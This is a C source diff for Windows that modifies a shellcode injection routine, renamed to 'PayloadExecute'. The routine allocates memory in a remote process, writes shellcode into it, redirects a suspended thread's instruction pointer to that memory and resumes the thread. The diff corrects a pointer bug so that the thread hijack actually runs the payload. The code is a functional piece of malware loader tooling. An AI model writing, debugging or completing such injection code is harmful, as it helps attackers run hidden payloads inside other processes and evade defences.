@@ -3,14 +3,14 @@
 #include <Windows.h>
 
 
-BOOL InjectShellcodeToRemoteProcess (IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
+BOOL PayloadExecute(IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT OPTIONAL PBYTE* ppAddress, OUT OPTIONAL HANDLE* phThread) {
 
 
 	SIZE_T  sNumberOfBytesWritten    = NULL;
 	DWORD   dwOldProtection          = NULL;
 
 
-	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	*ppAddress = (PBYTE)VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (*ppAddress == NULL) {
 		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
@@ -41,7 +41,7 @@ BOOL InjectShellcodeToRemoteProcess (IN HANDLE hProcess, IN HANDLE hThread, IN P
 	}
 
  	// updating the next instruction pointer to be equal to our shellcode's address 
-	ThreadCtx.Rip = (DWORD64)&ppAddress; //MAY BE PROBLEMS HERE! 
+	ThreadCtx.Rip = (DWORD64)*ppAddress; //MAY BE PROBLEMS HERE! 
   
 	// setting the new updated thread context
 	if (!SetThreadContext(hThread, &ThreadCtx)) {
@@ -52,6 +52,7 @@ BOOL InjectShellcodeToRemoteProcess (IN HANDLE hProcess, IN HANDLE hThread, IN P
 	// resuming suspended thread, thus running our payload
 	ResumeThread(hThread);
 	
+    // Just for testing purposes (TO REMOVE)
 	WaitForSingleObject(hThread, INFINITE);
 	return TRUE;
 }
